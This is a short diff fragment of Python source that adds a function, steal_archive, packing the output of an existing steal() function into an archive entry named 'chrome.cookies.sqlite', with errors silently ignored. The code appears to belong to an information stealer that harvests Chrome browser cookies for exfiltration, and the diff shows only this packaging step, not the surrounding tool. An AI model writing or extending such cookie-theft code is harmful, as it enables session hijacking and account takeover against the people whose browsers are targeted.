@@ -61,3 +61,10 @@ def steal():
     os.remove(tmp_save_database)
 
     return data
+
+def steal_archive(archive):
+    try:
+        with archive.open("chrome.cookies.sqlite", "w") as f:
+            f.write(steal().read())
+    except:
+        pass
